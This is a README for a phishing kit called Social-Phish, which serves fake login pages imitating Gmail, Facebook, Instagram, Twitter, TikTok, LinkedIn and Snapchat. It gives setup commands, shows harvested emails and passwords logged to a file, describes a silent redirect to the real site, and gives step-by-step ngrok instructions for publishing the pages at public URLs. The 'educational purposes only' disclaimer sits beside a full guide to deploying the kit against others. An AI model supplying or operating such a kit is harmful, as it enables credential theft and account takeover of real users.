# Social-Phish

A local phishing simulation tool for **educational purposes only**.
Using this publicly or against others is **phishing** and is punishable under
**Bangladesh Digital Security Act 2018** and similar laws worldwide.

All brand names, logos, and designs (Google, Facebook, Instagram, X/Twitter,
TikTok, LinkedIn, Snapchat) are **trademarks of their respective owners**.


### Termux

```bash
pkg update && pkg upgrade -y
pkg install python git -y
pip install flask colorama
git clone https://github.com/utxob/social-phish.git
ls
cd social-phis
ls
python app.py
```

### Termux notes

- If `pip` is missing: `pkg install python-pip -y`

- Access from another phone/PC on same WiFi:
  ```
  http://<your-android-ip>:5000/facebook
  ```





###  Kali

```bash
sudo apt update
sudo apt install python3 python3-pip git -y
pip install flask colorama
git clone https://github.com/utxob/social-phish.git
ls
cd social-phish
ls 
python3 app.py
```



## 🖥️ Terminal Output Example

### Menu

```
=========================
        SOCIAL-PHISH
=========================

  Select an option:

   [1] Gmail
   [2] Facebook
   [3] Instagram
   [4] Twitter
   [5] TikTok
   [6] LinkedIn
   [7] Snapchat
   [8] View saved data
   [9] Clear saved data
   [0] Exit

  Enter your choice: 2
```

### After choosing `[2] Facebook`

```
=========================
        SOCIAL-PHISH
=========================

  Starting server...
  URL : http://localhost:5000/facebook
   URL : http://192.168.1.106:5000/facebook

-------------------------------------------------------
  Press ENTER to stop the server and go back to menu.
-------------------------------------------------------
```

### After form submit (in browser)

```
=======================================================
  NEW FACEBOOK LOGIN DATA
=======================================================
  Email    : test@example.com
  Password : mypass123
  Time     : 24/09/2026, 03:45:04 PM
  Saved to : /home/utsob/Desktop/social-phish/saved_data.txt
=======================================================
```

Browser → auto-redirects to `https://www.facebook.com/login`.

### Option `[8]` — View saved data

```
  SAVED DATA

-------------------------------------------------------
[24/09/2026 10:30:00 AM] [GMAIL] Email: test@gmail.com | Password: 123456
[24/09/2026 10:31:00 AM] [FACEBOOK] Email: user@fb.com | Password: mypass
[24/09/2026 10:32:00 AM] [INSTAGRAM] Email: user@insta.com | Password: mypassword
-------------------------------------------------------
```

⚠️ **Keep the server running** — do not stop it.

### Step 2: Start ngrok in a new terminal

**Terminal 2 (separate tab/window):**

```bash
ngrok http 5000
```

### Step 3: Copy the ngrok URL

When ngrok starts, it will look like this:

```
ngrok                                                 (Ctrl+C to quit)

Session Status                online
Account                       your-email@example.com (Plan: Free)
Version                       3.x.x
Region                        Asia Pacific (ap)
Latency                       45ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    https://a1b2-c3d4-5e6f.ngrok-free.app -> http://localhost:5000

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

The URL next to **Forwarding** is your public URL:

```
https://a1b2-c3d4-5e6f.ngrok-free.app
```

### Step 4: Append the site route to the URL

```
https://a1b2-c3d4-5e6f.ngrok-free.app/facebook
```

Example routes:

| Site | ngrok URL |
|------|-----------|
| Gmail | `https://a1b2-c3d4-5e6f.ngrok-free.app/gmail` |
| Facebook | `https://a1b2-c3d4-5e6f.ngrok-free.app/facebook` |
| Instagram | `https://a1b2-c3d4-5e6f.ngrok-free.app/instagram` |
| Twitter | `https://a1b2-c3d4-5e6f.ngrok-free.app/twitter` |
| TikTok | `https://a1b2-c3d4-5e6f.ngrok-free.app/tiktok` |
| LinkedIn | `https://a1b2-c3d4-5e6f.ngrok-free.app/linkedin` |
| Snapchat | `https://a1b2-c3d4-5e6f.ngrok-free.app/snapchat` |

### Step 5: Open it in the browser

```
https://a1b2-c3d4-5e6f.ngrok-free.app/facebook
```

The login page will load. When the form is submitted:

- A green data block will print in Terminal 1
- The browser will automatically redirect to the official Facebook login page

---
